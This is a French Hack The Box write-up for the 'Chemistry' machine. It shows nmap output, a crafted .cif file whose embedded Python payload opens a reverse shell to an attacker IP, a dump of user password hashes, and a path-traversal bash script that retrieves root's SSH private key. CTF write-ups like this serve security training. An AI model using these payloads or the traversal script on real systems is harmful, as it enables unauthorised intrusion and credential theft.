# Chemistry HTB Challenge


```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -sV -sC -p- -vv 10.10.11.38    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-28 03:01 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:01
Completed NSE at 03:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:01
Completed NSE at 03:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:01
Completed NSE at 03:01, 0.00s elapsed
Initiating Ping Scan at 03:01
Scanning 10.10.11.38 [4 ports]
Completed Ping Scan at 03:01, 1.65s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:01
Completed Parallel DNS resolution of 1 host. at 03:01, 0.04s elapsed
Initiating SYN Stealth Scan at 03:01
Scanning 10.10.11.38 [65535 ports]
Discovered open port 22/tcp on 10.10.11.38
SYN Stealth Scan Timing: About 48.44% done; ETC: 03:02 (0:00:33 remaining)
Discovered open port 5000/tcp on 10.10.11.38
Completed SYN Stealth Scan at 03:02, 62.68s elapsed (65535 total ports)
Initiating Service scan at 03:02
Scanning 2 services on 10.10.11.38
Completed Service scan at 03:02, 6.16s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.38.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:02
Completed NSE at 03:02, 1.16s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:02
Completed NSE at 03:02, 0.17s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:02
Completed NSE at 03:02, 0.00s elapsed
Nmap scan report for 10.10.11.38
Host is up, received echo-reply ttl 63 (0.023s latency).
Scanned at 2025-01-28 03:01:10 EST for 70s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj5eCYeJYXEGT5pQjRRX4cRr4gHoLUb/riyLfCAQMf40a6IO3BMzwyr3OnfkqZDlr6o9tS69YKDE9ZkWk01vsDM/T1k/m1ooeOaTRhx2Yene9paJnck8Stw4yVWtcq6PPYJA3HxkKeKyAnIVuYBvaPNsm+K5+rsafUEc5FtyEGlEG0YRmyk/NepEFU6qz25S3oqLLgh9Ngz4oGeLudpXOhD4gN6aHnXXUHOXJgXdtY9EgNBfd8paWTnjtloAYi4+ccdMfxO7PcDOxt5SQan1siIkFq/uONyV+nldyS3lLOVUCHD7bXuPemHVWqD2/1pJWf+PRAasCXgcUV+Je4fyNnJwec1yRCbY3qtlBbNjHDJ4p5XmnIkoUm7hWXAquebykLUwj7vaJ/V6L19J4NN8HcBsgcrRlPvRjXz0A2VagJYZV+FVhgdURiIM4ZA7DMzv9RgJCU2tNC4EyvCTAe0rAM2wj0vwYPPEiHL+xXHGSvsoZrjYt1tGHDQvy8fto5RQU=
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzrl552bgToHASFlKHFsDGrkffR/uYDMLjHOoueMB9HeLRFRvZV5ghoTM3Td9LImvcLsqD84b5n90qy3peebL0=
|   256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIELLgwg7A8Kh8AxmiUXeMe9h/wUnfdoruCJbWci81SSB
5000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-title: Chemistry - Home
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:02
Completed NSE at 03:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:02
Completed NSE at 03:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:02
Completed NSE at 03:02, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.99 seconds
           Raw packets sent: 66746 (2.937MB) | Rcvd: 66017 (2.641MB)

```
Jeton un coup d'oeil a htttp://"IP":5000

On peut y voir Une page de login et par la suite acceder a un uploader de fichier .cif

Voici l'exemple:
```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

Shell :
En cherchant on apprend que l'on peut eploite le fichier .cif existant : 

```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.204/4444 0>&1\'");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
```
[*] Started reverse TCP handler on 10.10.14.204:4444 
[*] Command shell session 1 opened (10.10.14.204:4444 -> 10.10.11.38:57846) at 2025-01-28 03:17:06 -0500


Shell Banner:
sh: 0:
-----
          
$ 
```
On peut y rouver le hash de rosa je vous laisse chercher :)

```
meterpreter > pwd
/home/app/instance
meterpreter > ls
Listing: /home/app/instance
===========================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100700/rwx------  20480  fil   2025-01-28 03:24:32 -0500  database.db

┌──(kali㉿kali)-[~/Downloads]
└─$ sqlite3 database.db            
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> select * from user;
1|admin|2861debaxxxxxxxxxxxxxxxxxxxxxx
2|app|2861debaxxxxxxxxxxxxxxxxxxxxxx
3|rosa|632861debaxxxxxxxxxxxxxxxxxxxxxx
4|robert|02fcf7cfv2861debaxxxxxxxxxxxxxxxxxxxxxx
5|jobert|3decxxxxxxxxxxxxxxxxxxxxxd3b670ab2
6|carlos|9ad4882xxxxxxxxxxxxxxxxxxxx7f6510c8f8
7|peter|6845c17xxxxxxxxxxxxxxxxxxxx27bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|user|ee11cbb19052e40b07aac0ca060c23ee
16|aaaaa|594f803b380a41396ed63dca39503542
17|aaaaaaaaa|e09c80c42fda55f9d992e59ca6b3307d
18|pippo|0c88028bf3aa6a6a143ed846f2be1ea4
19|prova|189bbbb00c5f1fb7fba9ad9285f193d1
sqlite> 

```

```
rosa@chemistry:~$ cat user.txt
1319d41bd76xxxxxxxxxxxxxxxxxx
```
En utilisant des *tools tel que Linpeas vous tomber sur des pistes 
```
./exploit.sh
[+] Testing with /xxxxx/../root/.ssh/id_rsa
        Status code --> 404
[+] Testing with /xxxxx/../../root/.ssh/id_rsa
        Status code --> 404
[+] Testing with /xxxxxx/../../../root/.ssh/id_rsa
        Status code --> 200
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsFbYzGxskgZ6YM1LOUJsjU66WHi8Y2ZFQcM3G8VjO+NHKK8P0hIU
1arrDbm+uzE+QNAAAADnJvb3RAY2hlbWlzdHJ5AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```
EXPLOIT.SH:
```
#!/bin/bash

url="http://10.10.11.38:8080"
string="../"
payload="/assets/"
file=".ssh/id_rsa" # without the first /

for ((i=0; i<20; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"

    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done

```
```
┌──(kali㉿kali)-[~/Downloads]
└─$ chmod 600 id_rsa 
                                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh -i id_rsa root@10.10.11.38 
```

```

root@chemistry:~# id
uid=0(root) gid=0(root) groups=0(root)
root@chemistry:~# ls
root.txt
```
